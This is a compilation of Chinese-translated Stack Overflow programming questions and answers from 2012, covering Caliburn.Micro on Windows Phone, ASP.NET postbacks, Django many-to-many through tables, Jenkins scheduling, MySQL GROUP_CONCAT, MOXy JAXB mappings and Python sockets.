> 时间：2012-12-20T09:43:21.080

由于您在 UserControl 上放置了引导程序，因此似乎`PhoneApplicationService`可能已经实例化 - 您是否尝试将引导程序放在应用程序资源部分？

CM 源代码显示 CM`PhoneApplicationService`在引导程序初始化时创建了一个新实例，这看起来像问题，您的应用程序的根必须已经创建了一个实例。

您是否有理由不能以标准方式（在应用程序资源中）使用 boostrapper？您的 App.xaml 是否包含初始化程序`PhoneApplicationService`？

编辑：

您收到错误的 CM 源位于`PrepareApplication`. 例如

```
protected override void PrepareApplication() {
        base.PrepareApplication();

            phoneService = new PhoneApplicationService();
            phoneService.Activated += OnActivate;
            phoneService.Deactivated += OnDeactivate;
            phoneService.Launching += OnLaunch;
            phoneService.Closing += OnClose;

            Application.ApplicationLifetimeObjects.Add(phoneService);

            if (phoneApplicationInitialized) {
                return;
            }

            RootFrame = CreatePhoneApplicationFrame();
            RootFrame.Navigated += OnNavigated;

            phoneApplicationInitialized = true;
        } 
```

您可能只是将其子类化，而不是创建新的 PhoneApplicationService 而是重用现有的：

```
 /// <summary>
    /// A custom bootstrapper designed to setup phone applications.
    /// </summary>
    public class CustomPhoneBootstrapper : Bootstrapper {
    bool phoneApplicationInitialized;
    PhoneApplicationService phoneService;

    /// <summary>
    /// The root frame used for navigation.
    /// </summary>
    public PhoneApplicationFrame RootFrame { get; private set; }

    /// <summary>
    /// Provides an opportunity to hook into the application object.
    /// </summary>
    protected override void PrepareApplication(PhoneApplicationService phoneAppService, PhoneApplicationFrame rootFrame) {
        base.PrepareApplication();

        phoneService = phoneAppService;
        phoneService.Activated += OnActivate;
        phoneService.Deactivated += OnDeactivate;
        phoneService.Launching += OnLaunch;
        phoneService.Closing += OnClose;

        Application.ApplicationLifetimeObjects.Add(phoneService);

        if (phoneApplicationInitialized) {
            return;
        }

        RootFrame = rootFrame;
        RootFrame.Navigated += OnNavigated;

        phoneApplicationInitialized = true;
    }

    void OnNavigated(object sender, NavigationEventArgs e) {
        if (Application.RootVisual != RootFrame) {
            Application.RootVisual = RootFrame;
        }
    }

    /// <summary>
    /// Occurs when a fresh instance of the application is launching.
    /// </summary>
    protected virtual void OnLaunch(object sender, LaunchingEventArgs e) { }

    /// <summary>
    /// Occurs when a previously tombstoned or paused application is resurrected/resumed.
    /// </summary>
    protected virtual void OnActivate(object sender, ActivatedEventArgs e) { }

    /// <summary>
    /// Occurs when the application is being tombstoned or paused.
    /// </summary>
    protected virtual void OnDeactivate(object sender, DeactivatedEventArgs e) { }

    /// <summary>
    /// Occurs when the application is closing.
    /// </summary>
    protected virtual void OnClose(object sender, ClosingEventArgs e) { }
} 
```

免责声明：不确定这是否会起作用，因为我从未开发过 Windows Phone，但据我所知，这应该做原始引导程序所做的事情，但跳过了应用程序和根框架的创建。您只需要提供应用程序和根框架（或者如果您可以从应用程序对象获取根框架，则可能只是应用程序 - 就像我说的那样，不知道有什么可能）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:59:04.553

它不打算在 UserControl 的资源中使用，所以我不能保证任何好的或坏的行为。引导程序应该在应用程序资源中使用，或者您可以直接在代码中实例化它。尝试在 InitializeComponent 调用之后在用户控件的 ctor 中创建它。

# asp.net - ASP.NET：在回发之前找到哪个元素有焦点？

> ID：13957036
> 
> 赞同：1
> 
> 时间：2012-12-19T16:42:44.070
> 
> 标签：asp.net, postback

我在页面上有一系列控件，包括一些用于记录员工时间表的文本框。当**OnTextChanged**触发时，页面回发并更新整体工作时间和分钟。

问题是，当用户单击保存按钮时，会发生回发，但这不是因为***保存按钮***的操作，而是因为 OnTextChanged 已触发。用户认为保存顺利，直到他/她再次访问该页面并且没有找到他/她的数据。几乎不可能向用户解释他们需要单击两次，因为第一次文本框失去焦点，第二次是正确的。

有没有办法存储在回发发生之前具有焦点的最后一个元素的值？我试图访问**__LASTFOCUS**的值，但我得到一个空字符串。

```
string lastFocus = Page.Request.Params.Get("__LASTFOCUS"); 
```

感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T18:38:34.977

如果你试图抓住最后一个失去焦点的控件，它具有 AutoPostBack="true"，我相信你可以从`Request.Form.Get("__EVENTTARGET")`. 此表单变量包含任何调用回发的控件的 ID（在大多数情况下，如果不是全部情况下）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-09-25T15:04:51.547

我对带有任意数量文本框的 GridView 也有类似的情况，每个文本框都有 AutoPostBack on 和 OnTextChanged 事件处理程序。我想要做的是能够从文本框中跳出，回发，然后将焦点恢复到在回发之前具有焦点的文本框，例如我**切换到**的文本框。

这就是我最终的结果：

```
function RestoreFocus(source, args) {
        var val = $("#<%=postbackFocusID.ClientID %>").attr("value");
        var el = document.getElementById(val);
        if (el != null)
            el.focus();
    }
    function PersistElementThatHasFocus(source, args) {
        $("#<%=postbackFocusID.ClientID %>").attr("value", document.activeElement.id);
    }
    function AddRequestHandler() {
        var prm = Sys.WebForms.PageRequestManager.getInstance();
        prm.add_endRequest(RestoreFocus);
        prm.add_beginRequest(PersistElementThatHasFocus);
    } 
```

postbackFocusID 只是一个 asp:HiddenField。

# asp.net - ASP.NET 1.1：服务器挂起/无响应 - 如何调试？

> ID：13957037
> 
> 赞同：0
> 
> 时间：2012-12-19T16:42:46.537
> 
> 标签：asp.net, iis-6

好的，我知道它不应该是 1.1，但是由于客户端没有支付迁移（和服务器维护），它还没有完成 :( (Win2003, IIS6, ASP1.1)

直到昨天，该应用程序还没有运行并返回错误。但至少它返回**了一些东西**！所以我进行了一些调试，添加了丢失的 DLL 等 - 突然我不再得到任何东西，浏览器无休止地等待关闭请求。

应用程序日志没有返回任何内容，感觉应用程序甚至没有进入 Page_Load。所以我去了 IIS 日志 - 最后一个条目是对链接到 aspx 页面的 HTML 页面的请求。

有什么想法可以诊断吗？我很难过:((

# ruby-on-rails-3 - Delayed_Paperclip 作业完成

> ID：13957040
> 
> 赞同：1
> 
> 时间：2012-12-19T16:42:55.873
> 
> 标签：ruby-on-rails-3, paperclip, resque, delay

我目前正在使用延迟，它已成功启动并运行。但是，当作业从 resque 完成时，我似乎无法添加挂钩。我目前拥有的代码正在侦听正确的队列，但似乎仍然无法正常工作。我可能犯了一个非常简单，愚蠢的错误，但我似乎无法弄清楚。

这是模型（据我所知，工作正常）：

```
class Entry < ActiveRecord::Base
  attr_accessible :approved, :entry_text, :reviewed, :user_id, :photo

  has_attached_file :photo, :styles => { :small => "250x250", :large => "500x500>" },
    :url => "link-to-s3-will-be-env-var",
    :path => "path/:id/:basename.:extension"

  process_in_background :photo

end 
```

然后是我的小工人阶级（似乎没有运行的部分）

```
class PhotoProcessor
    @queue = :paperclip
    def self.perform(photo_id)

        puts "*****************OMGOMGOMGOMGOMGOMGOMGOMGOMGOMGOMGOMGOMGOMGOMGOMGOMGOMG*********************"
        puts photo_id.inspect
    end
end 
```

我不能让它输出疯狂的字符串，只是为了测试目的，但我什至不能调用这个方法。感谢您的帮助，我显然遗漏了一些明显的东西。

# asp.net-mvc - 将模型传递给 RedirectToAction()

> ID：13957041
> 
> 赞同：7
> 
> 时间：2012-12-19T16:43:11.730
> 
> 标签：asp.net-mvc, redirecttoaction

我很好奇这是如何工作的。在 MVC 中，您可以调用 View() 并将模型作为参数传递，但 RedirectToAction（至少是其化身之一）采用“routeValues”对象，这似乎是最接近的匹配项。

如果您的模型在此参数中传递，该模型类型是否可以在后续操作方法中使用？或者在某些情况下是否存在可能妨碍准确翻译的警告？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:02:11.800

如果您需要在重定向后将一些复杂的对象传递给操作，您可能希望使用 Session 或 TempData：

来自“[什么是 ASP.NET MVC TempData](http://www.devcurry.com/2012/05/what-is-aspnet-mvc-tempdata.html) ”

> ASP.NET MVC TempData 字典用于在控制器操作之间共享数据。TempData 的值一直持续到它被读取或当前用户的会话超时

默认情况下，TempData 使用 Session 来保存信息，但是，与 MVC 的大部分内容一样，这是一个可扩展点，如果您愿意，您可以在其中插入[基于 Cookie 的提供程序](http://brockallen.com/2012/06/11/cookie-based-tempdata-provider/)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-19T16:50:38.150

您不能在其中传递模型对象，但可以传递将映射到您重定向到的操作中的模型的各个属性。

这通过构建 url 以重定向到使用属性和接收操作中的模型绑定器来工作。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-19T16:47:49.293

`Redirect...`方法会导致客户端往返行程，所以 - 不，该模型将不可用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-05-13T19:42:57.797

我认为这就是你想要的：

1.  将模型保存在 Tempdata 中

    ```
     RequestModel rq = new  RequestModel()   
            ....assign something to your model..
            TempData["request"] = rq;

            return Redirect("RequestAcknowledgement"); 
    ```

2.  现在为您要重定向到的视图创建一个操作结果，并将您的 TempData 传递回模型。然后将模型返回到视图。

    ```
     public ActionResult RequestAcknowledgement()
        {
           RequestsModel request =  (RequestsModel)TempData["request"];

           return View(request);
        } 
    ```

# twitter-bootstrap - 带有跨度包装的 Twitter 引导行

> ID：13957042
> 
> 赞同：10
> 
> 时间：2012-12-19T16:43:17.720
> 
> 标签：twitter-bootstrap, rows

使用 twitter 引导程序，我试图弄清楚为什么最后一个“列”会换行。

```
<div class="row span4 solidBottom">
        <div class="span1">
            <label>A</label>
        </div>
        <div class="span1">
            <label>B</label>
        </div>
        <div class="span1">
            <label>C</label>
        </div>
        <div class="span1">
            <label>D</label>
        </div>
</div> 
```

结果是：

```
 A   B   C 
 D
___________

SPAN 4 = 300px
Four Span1s = 240
3 Paddings = 60
240 + 60 = 300 
```

那么关于它为什么会包装的任何线索？

我正在尝试制作多列表单，并希望保持列和行的组织。

谢谢你。

编辑：添加`style="width:auto"`到行可以解决问题，但为什么 300px 默认宽度会换行？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-27T04:45:54.527

你是正确的 span4 是 300px，但我相信你的 HTML 有错误。

您需要将嵌套列包装在新的 .row 类中。当你这样做时，包装停止。有关使用默认（非流体）引导网格的示例， 请参见[http://jsfiddle.net/panchroma/UBTv4/ 。](http://jsfiddle.net/panchroma/UBTv4/)

这是我使用的 HTML：

```
<div class="container">

<div class="row">
    <div class="span4 solidBottom">

        <div class="row">
            <div class="span1">
                <label>A</label>
            </div>

            <div class="span1">
                <label>B</label>
            </div>

            <div class="span1">
                <label>C</label>
            </div>

            <div class="span1">
                <label>D</label>
            </div>

        </div> <!-- end nested row -->

        <div class="span8"> </div>

  </div> <!-- end parent row -->
</div> <!-- end container --> 
```

对于固定网格，嵌套行中的列数应与父列中的列数相加（即本例中的列数）

如果您使用流体网格（即行流体），则嵌套行中的列数应加起来为 12。

# emacs - 设置字节编译目标文件功能

> ID：13957049
> 
> 赞同：0
> 
> 时间：2012-12-19T16:43:39.353
> 
> 标签：emacs, elisp

我想使用相对路径设置 emacs lisp 字节编译的目标目录，例如`../foo`. 我想我应该使用`byte-compile-dest-file-function`，但不知道如何设置它。我该如何设置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:38:11.610

要设置`byte-compile-dest-function`变量，您可以`customize-variable`交互使用，也可以`setq`在您的 init 文件中使用。因为无论哪种方式，您都必须编写一个函数来完成这项工作，我建议使用后者，以便所有内容都在您的 init 文件中的同一个位置。

例如：

```
(defun my-dest-function (filename)
  (concat (file-name-directory filename)
          "../"
          (file-name-sans-extension (file-name-nondirectory filename))
          ".elc"))
(setq byte-compile-dest-file-function 'my-dest-function) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:27:27.777

您可以使用 Ch v 后跟该变量名找到它。

```
(defcustom byte-compile-dest-file-function nil
  "Function for the function `byte-compile-dest-file' to call.
It should take one argument, the name of an Emacs Lisp source
file name, and return the name of the compiled file."
  :group 'bytecomp
  :type '(choice (const nil) function)
  :version "23.2") 
```

您可以看到它是一个可自定义的变量，因此您可以将其值更改为“函数”。

编辑：我不太确定这是您要更改的变量。事实上，你可以看到它经常处理变量目录，我看不到如何设置所有.elc应该去的某个目录。

# django - Django 模型 - 数量字段

> ID：13957052
> 
> 赞同：5
> 
> 时间：2012-12-19T16:43:44.473
> 
> 标签：django, django-models

我正在使用 Django 在我工作的地方创建零件库存。这是我拥有的模型的片段：

```
class Part(models.Model):
    description = models.CharField(max_length=64)
    number= models.CharField(max_length=64)
    price= models.FloatField()

class Group(models.Model):
    name = models.CharField(max_length=64)
    parts = models.ManyToManyField(Part) 
```

所以我有不同的组（订单），里面有一些部分。

我想要做的是为我的小组的各个部分设置一个数量属性。但是，如果我想将数量字段添加到我的 Part 对象，每个组将具有相同的数量，这不是正确的行为。我怎样才能让我的小组记住他们每个部分有多少？

感谢您的意见，我希望这不是一个完全的菜鸟问题！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T16:47:48.787

你需要一个[直通表](https://docs.djangoproject.com/en/dev/topics/db/models/)：

> 中间模型与 ManyToManyField 相关联，使用 through 参数指向将充当中介的模型。

```
class Part(models.Model):
    description = models.CharField(max_length=64)
    number= models.CharField(max_length=64)
    price= models.FloatField()

class Group(models.Model):
    name = models.CharField(max_length=64)
    parts = models.ManyToManyField(Part, through='GroupPart') 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-19T16:44:54.520

在和之间创建一个新的[通过表](https://docs.djangoproject.com/en/dev/topics/db/models/#extra-fields-on-many-to-many-relationships)来保存数量。`Group``Part`

# jenkins - 如何在詹金斯每天午夜 1 点配置 poll scm

> ID：13957054
> 
> 赞同：-1
> 
> 时间：2012-12-19T16:43:44.907
> 
> 标签：jenkins

我想每天凌晨 1 点配置 poll scm，除了周六和周日在詹金斯。有没有其他方法可以进行夜间构建

构建成功后如何向团队发送构建报告。

如何将单元测试用例集成到詹金斯

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T20:07:25.667

对于 cron 计划，试试这个：
`0 0 * * 1-5`
最后的 1-5 表示仅在第 1 到第 5 天。第 0 天是星期日，第 1 天是星期一，依此类推。

对于电子邮件，在构建后操作中选中**电子邮件通知**，并指定要包含在通知中的电子邮件地址。有关更高级的电子邮件选项，请考虑下载和调查[https://wiki.jenkins-ci.org/display/JENKINS/Email-ext+plugin](https://wiki.jenkins-ci.org/display/JENKINS/Email-ext+plugin)

对于您的最后一个问题，您没有提供任何信息来帮助我们回答。什么语言的单元测试？您是否已经用 SVN 编写了单元测试？你在做什么类型的构建？Maven 单元测试将由 Maven 直接执行，而 PHP 单元测试用例需要其他东西。没有足够的信息来回答这个问题。

# mysql - 如何将 GROUP_CONCAT 添加到我的 UNION 查询中？

> ID：13957058
> 
> 赞同：1
> 
> 时间：2012-12-19T16:44:00.633
> 
> 标签：mysql

我有以下查询可以正常获取正确的电子邮件，并给出以下结果： - user1@company.com - user2@company.com - 等

问题：如何添加 MySQL **GROUP_CONCAT**函数，以便结果用逗号分隔：- user1@company.com、user2@company.com 等

这只是我的联合查询的一部分：

## - 当我向它提供票号时，它会检查票上的票证类型值并仅返回那些在后端表中检查了该类型的用户。

```
SELECT CONCAT(tblemailaction.uea_User, "@company.com") AS User_email,                 tblemailaction.uea_ADSL
FROM tblemailaction, tbltickets, tbltickettype
WHERE tbltickets.ttType = tbltickettype.ttDesc
 AND tbltickettype.ttID = tblemailaction.uea_ADSL
 AND ttNum = <cfqueryparam cfsqltype="cf_sql_integer" value="#url.id#">

UNION ALL

SELECT CONCAT(tblemailaction.uea_User, "@company.com") AS User_email,          tblemailaction.uea_ADSL_INSTALL
FROM tblemailaction, tbltickets, tbltickettype
WHERE tbltickets.ttType = tbltickettype.ttDesc
 AND tbltickettype.ttID = tblemailaction.uea_ADSL_INSTALL
 AND ttNum = <cfqueryparam cfsqltype="cf_sql_integer" value="#url.id#">

UNION ALL

SELECT CONCAT(tblemailaction.uea_User, "@company.com") AS User_email, tblemailaction.uea_Cabling
FROM tblemailaction, tbltickets, tbltickettype
WHERE tbltickets.ttType = tbltickettype.ttDesc
 AND tbltickettype.ttID = tblemailaction.uea_Cabling
 AND ttNum = <cfqueryparam cfsqltype="cf_sql_integer" value="#url.id#">

UNION ALL

SELECT CONCAT(tblemailaction.uea_User, "@company.com") AS User_email, tblemailaction.uea_Calix
FROM tblemailaction, tbltickets, tbltickettype
WHERE tbltickets.ttType = tbltickettype.ttDesc
 AND tbltickettype.ttID = tblemailaction.uea_Calix
 AND ttNum = <cfqueryparam cfsqltype="cf_sql_integer" value="#url.id#"> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:07:21.007

首先，请注意`GROUP_CONCAT`函数受`max_allowed_packet`变量值的限制，通常设置为 1048576（即 1MB）。当然，这个变量的值可以增加，但要注意有一个限制。

快速的答案是将整个查询“包装”在一组括号中，并将其作为查询中的行源引用。基本上，将您的查询变成“内联视图”。

```
SELECT GROUP_CONCAT(v.User_email)
  FROM (
         /* your UNION ALL query here */
       ) q 
```

* * *

要删除重复项，您可以使用 DISTINCT 关键字。要获取特定序列中的值，可以使用 ORDER BY 子句。

```
SELECT GROUP_CONCAT(DISTINCT v.User_email ORDER BY v.User_email)
  FROM (
         /* your UNION ALL query here */
       ) q 
```

再次注意，`GROUP_CONCAT`函数返回的字符串的长度受 值的限制`max_allowed_packet`。

* * *

**后续问：**我如何从列表中“排除”或过滤掉一封电子邮件。例如： - 如果 SESSION.kt_email = “列表中的电子邮件之一” 那么从列表中删除

**答：**快速回答是举例。如果您有一个要排除的电子邮件地址，例如`'foo'`，为了这个示例：

```
SELECT GROUP_CONCAT( NULLIF(v.User_email,'foo') )
  FROM (
         /* your UNION ALL query here */
       ) q 
```

这里的技巧是我们`'foo'`用 a替换任何值`NULL`，`GROUP_CONCAT`并将“跳过”任何 NULL 值并将它们从返回字符串中排除。

表达方式：

```
 NULLIF(v.User_email,'foo') 
```

是以下的简写：

```
 IF(v.User_email='foo',NULL,v.User_email) 
```

这相当于（更多的ANSI标准）：

```
 CASE WHEN v.User_email = 'foo' THEN NULL ELSE v.User_email END 
```

当然，您可以将文字`'foo'`（在我的示例中）替换为您想要排除的任何字符串值或表达式。

# xml - 使用 netbeans 解析媒体类型 'application/xml' 时发布请求时出错

> ID：13957060
> 
> 赞同：1
> 
> 时间：2012-12-19T16:44:06.333
> 
> 标签：xml, json, rest, netbeans, jersey

我已经用 netbeans IDE 实现了一些 rest webservices，但是在测试 post 请求时，我得到了一些异常，如下所示：

```
 POST RequestFailed RequestFailed --> Status: (500) 
 Response: { ......
 javax.ws.rs.WebApplicationException: java.lang.IllegalArgumentException: Error parsing media type ', application/xml'
 Content may not have Container-Containee Relationship. 
```

和 post 方法相关的代码是

```
@POST
@Override
@Consumes({"application/xml", "application/json"})
public void create(Mobilereading entity) {
    super.create(entity);
} 
```

通常一切似乎都是正确的，但我不知道问题出在哪里？任何解决方案请*

![在此处输入图像描述](../Images/046d12aa6661e6156891ef944251bf6a.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T11:22:57.753

修改我们的代码为

```
@POST
@Override
@Consumes({"application/xml", "application/json"})
public void create(JAXBElement<Mobilereading> entity) {
    super.create(entity);
} 
```

# xml - 使用 MOXy 避免循环，@XmlInverseReference @XmlID

> ID：13957068
> 
> 赞同：3
> 
> 时间：2012-12-19T16:45:00.340
> 
> 标签：xml, hibernate, resteasy, moxy

我正在使用 Hibernate 和 RESTeasy，我尽量避免这些实体的循环，因为我在 Artiste 和 Oeuvre 实体之间有 OneToMany (ManyToOne) 双向关系：

**全部作品.java**

```
import javax.persistence.*;
import javax.xml.bind.annotation.*;
import org.eclipse.persistence.oxm.annotations.XmlInverseReference;

@Entity
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
@XmlRootElement(name = "oeuvre")
public abstract class Oeuvre {

    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private int id;
    @Embedded
    private Dimension dimension;

    @XmlElement(defaultValue = "true")
    private boolean hasBeenReproduced;

    @ManyToOne(cascade = CascadeType.PERSIST, fetch = FetchType.LAZY)
    @JoinColumn(name = "artiste_id")
    @XmlIDREF
    private Artiste artiste;

    @XmlElement
    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    // @XmlTransient
    @XmlInverseReference(mappedBy = "oeuvres")
    public Artiste getArtiste() {
        return artiste;
    }

    public void setArtiste(Artiste artiste) {
        this.artiste = artiste;
        artiste.addOeuvre(this);
    }

} 
```

**Personne.java**

```
import javax.persistence.*;
import javax.xml.bind.annotation.XmlID;

@Entity
@Inheritance(strategy = InheritanceType.TABLE_PER_CLASS)
public abstract class Personne {

    @Id
    @GeneratedValue(strategy = GenerationType.TABLE)
    @XmlID
    private int id;

} 
```

**Artiste.java**

```
import java.util.*;
import javax.persistence.*;
import javax.xml.bind.annotation.*;

@Entity
@XmlRootElement(name = "artiste")
public class Artiste extends Personne {

    private String bibliographie;

    @OneToMany(mappedBy = "artiste", orphanRemoval = true, cascade = {
            CascadeType.PERSIST, CascadeType.REMOVE })
    private List<Oeuvre> oeuvres = new ArrayList<Oeuvre>();

    @XmlElement
    public List<Oeuvre> getOeuvres() {
        return oeuvres;
    }

    public void setOeuvres(List<Oeuvre> oeuvres) {
        this.oeuvres = oeuvres;
    }

} 
```

所以我决定使用 MOXy，

这是我的POM

```
<repository>
        <id>EclipseLink</id>
        <url>http://download.eclipse.org/rt/eclipselink/maven.repo</url>
</repository>
<dependency>
       <groupId>org.eclipse.persistence</groupId>
       <artifactId>org.eclipse.persistence.moxy </artifactId>
       <version>2.3.2</version>     
    </dependency> 
```

注意：我只想拥有 org.eclipse.persistence.moxy-2.3.2.jar，因为我正在使用休眠（我不想要 eclipseLink），但我还有 3 个其他 jars（包括核心）

然后我在我的实体包中放了一个 jaxb.properties 文件：

```
javax.xml.bind.context.factory=org.eclipse.persistence.jaxb.JAXBContextFactory 
```

并将@XmlInverseReference(mappedBy="oeuvres") 添加到getArtiste() 而不是@XmlTranscient ==> 我不再有循环（如xmlTranscient），但我仍然没有任何后向指针。

然后我添加了@XmlID 和@XmlIDREF，艺术家的 id 现在以艺术品的 xml 结果表示，但它没有很好的价值（0 但应该是别的东西）

```
<Oeuvre>
  <hasBeenReproduced>false</hasBeenReproduced>
  <artiste>0</artiste>
  <year>2010</year>
  <id>2</id>
  <titre>La joconde</titre>
</Oeuvre> 
```

我究竟做错了什么 ？提前谢谢

**编辑 ：**

好的，当我编组“Artiste”对象时，我使用@XmlInverseReference 得到以下输出：

```
<artiste>
  <id>1</id>
  <nom>a</nom>
  <prenom>b</prenom>
  <oeuvres>
     <hasBeenReproduced>false</hasBeenReproduced>
     <year>2010</year>
     <id>25</id>
     <titre>La joconde</titre>
  </oeuvres>
</artiste> 
```

根据您的示例，这是正确的行为。因此，如果我理解得很好，就不可能在“Oeuvre”输出（如上所示）中引用艺人 ID。我们无法从艺术品中检索艺术家。就我而言，我不必使用 @XmlID 吗？

感谢您的完整回答 Blaise Doughan，非常感谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T20:31:52.927

**注意：** 我是[**EclipseLink JAXB (MOXy)**](http://www.eclipse.org/eclipselink/moxy.php)负责人，也是[**JAXB (JSR-222)**](http://jcp.org/en/jsr/detail?id=222)专家组的成员。

下面是如何使用 MOXy`@XmlInverseReference`扩展的简化示例。

**富**

`Foo`是本例的根对象。

```
package forum13957068;

import java.util.List;

import javax.xml.bind.annotation.*;

@XmlRootElement
@XmlAccessorType(XmlAccessType.FIELD)
public class Foo {

    String fooProp;

    @XmlElement(name="bar")
    List<Bar> bars;

} 
```

**酒吧**

`Bar`是一个子对象。我们使用注释来使用对父对象的引用来`@XmlInverseReference`填充字段。`foo`

```
package forum13957068;

import javax.xml.bind.annotation.*;
import org.eclipse.persistence.oxm.annotations.XmlInverseReference;

@XmlAccessorType(XmlAccessType.FIELD)
public class Bar {

    private String barProp;

    @XmlInverseReference(mappedBy="bars")
    Foo foo;

} 
```

**jaxb.properties**

要将 MOXy 指定为您的 JAXB 提供程序，您需要包含一个`jaxb.properties`使用以下条目调用的文件：

```
javax.xml.bind.context.factory=org.eclipse.persistence.jaxb.JAXBContextFactory 
```

**输入.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<foo>
    <fooProp>A</fooProp>
    <bar>
        <barProp>B</barProp>
    </bar>
    <bar>
        <barProp>B</barProp>
    </bar>
</foo> 
```

**演示**

以下演示代码将解组 XML，检查返回指针，然后将对象编组回 XML。

```
package forum13957068;

import java.io.File;
import javax.xml.bind.*;

public class Demo {

    public static void main(String[] args) throws Exception {
        JAXBContext jc = JAXBContext.newInstance(Foo.class);

        Unmarshaller unmarshaller = jc.createUnmarshaller();
        File xml = new File("src/forum13957068/input.xml");
        Foo foo = (Foo) unmarshaller.unmarshal(xml);

        for(Bar bar : foo.bars) {
            System.out.println(bar.foo == foo);
        }

        Marshaller marshaller = jc.createMarshaller();
        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
        marshaller.marshal(foo, System.out);
    }

} 
```

**输出**

下面是运行演示代码的输出。节点如何正确填充反向指针。

```
true
true
<?xml version="1.0" encoding="UTF-8"?>
<foo>
   <fooProp>A</fooProp>
   <bar>
      <barProp>B</barProp>
   </bar>
   <bar>
      <barProp>C</barProp>
   </bar>
</foo> 
```

* * *

**MOXy 和 Maven**

您可以在`pom.xml`文件中使用以下内容来拉入 MOXy。

```
<dependencies>
    <dependency>
        <groupId>org.eclipse.persistence</groupId>
        <artifactId>org.eclipse.persistence.moxy</artifactId>
        <version>2.4.1</version>
    </dependency>
</dependencies>
<repositories>
    <repository>
        <id>EclipseLink Repo</id>
        <url>http://download.eclipse.org/rt/eclipselink/maven.repo</url>
    </repository>
</repositories> 
```

对于一些引入 MOXy 的示例 POM 文件，请查看我在 GitHub 上托管的示例：

*   [https://github.com/bdoughan](https://github.com/bdoughan)

* * *

**更新**

> 根据您的示例，这是正确的行为。因此，如果我理解得很好，就不可能在“Oeuvre”输出（如上所示）中引用艺人 ID。我们无法从艺术品中检索艺术家。就我而言，我不必使用 @XmlID 吗？

下面我提供了一个使用`@XmlID`/`@XmlIDREF`而不是`@XmlInverseReference`.

**富**

```
package forum13957068;

import java.util.List;
import javax.xml.bind.annotation.*;

@XmlRootElement
@XmlAccessorType(XmlAccessType.FIELD)
public class Foo {

    @XmlID
    String id;

    String fooProp;

    @XmlElement(name="bar")
    List<Bar> bars;

} 
```

**酒吧**

```
package forum13957068;

import javax.xml.bind.annotation.*;

@XmlAccessorType(XmlAccessType.FIELD)
public class Bar {

    private String barProp;

    @XmlIDREF
    Foo foo;

} 
```

**输入.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<foo>
    <id>1</id>
    <fooProp>A</fooProp>
    <bar>
        <foo>1</foo>
        <barProp>B</barProp>
    </bar>
    <bar>
        <foo>1</foo>
        <barProp>B</barProp>
    </bar>
</foo> 
```

**了解更多信息**

*   [http://blog.bdoughan.com/2010/10/jaxb-and-shared-references-xmlid-and.html](http://blog.bdoughan.com/2010/10/jaxb-and-shared-references-xmlid-and.html)

# python - 客户端/服务器未在 Python 中接收数据

> ID：13957071
> 
> 赞同：1
> 
> 时间：2012-12-19T16:45:09.650
> 
> 标签：python

我对套接字编程完全陌生。我有一个产品并试图连接。我可以发送数据并在产品上查看其结果，但我收不到任何东西。这是我的脚本：

```
import socket
def ScktConn():
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('127.0.0.1', 5006))
# our local IP is 192.168.2.1, but it works even with 127.0.0.1, I don't know from where       #it is coming
 Freq=raw_input('Frequency(450-2500): ')
 CmdF='0 ace_set_frequency C1 '+str(Freq)+' \r\n'
 s.send(CmdF)
# so far I sent a tcl command to product to set the frequency and it works
 s.send('0 ace_azplayer_remove_player XXX \r\n')
# sending another tcl command and works
 s.send('0 ace_azplayer_add_player \r\n')
# here it is working too
 s.send('0 ace_azplayer_add_ace XXX C1\r\n')
 Path='C:/Users/AM_RJ/Desktop/gridview_script/PBF/4x4U_wocorr_SNR.csv'
 s.send('0 ace_azplayer_load_csvfile AzPlayer1 '+Path+' \r\n')
# here I should receive some numbers, but always returning me 0!
#even if I send ('hello!') and use recv(1024), it returns 0!
 csvid=s.recv(4096)
 print csvid
 Path2='0 ace_azplayer_edit_playback_file AzPlayer1 '+str(csvid)+' -linkConfiguration "4x4" \r\n'
 print Path2
 s.send(Path2) 
```

使用后`recv(4096)`，我应该会收到一些号码，但它总是返回我`0`！即使我发送`('hello!')`使用`recv(1024)`，它也会返回`0`！我正在使用python 2.7。我什至不确定服务器端和客户端在我的脚本中是否正确！请帮帮我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:10:11.083

您需要多个套接字，这是一个最小的示例（需要更多工作才能使其健壮）。ScktConn 产生一个新线程，该线程创建一个服务器套接字，用于侦听来自`s`.

```
import socket
import threading
import time

address = ('127.0.0.1', 5007)
def ScktRecv():
    r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    r.bind(address)
    r.listen(1)
    conn, _ = r.accept()
    csvid = conn.recv(4096)
    print "recv: %s" % csvid

def ScktConn():
    recv_thread = threading.Thread(target=ScktRecv)
    recv_thread.start()
    time.sleep(1)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(address)
    # our local IP is 192.168.2.1, but it works even with 127.0.0.1, I don't know from where       #it is coming
    Freq=raw_input('Frequency(450-2500): ')
    CmdF='0 ace_set_frequency C1 '+str(Freq)+' \r\n'
    s.send(CmdF) 
```

# javascript - 你如何在 jQuery 中使用偏移量进行迭代？

> ID：13957072
> 
> 赞同：2
> 
> 时间：2012-12-19T16:45:09.543
> 
> 标签：javascript, jquery, iteration, each

给定 HTML...

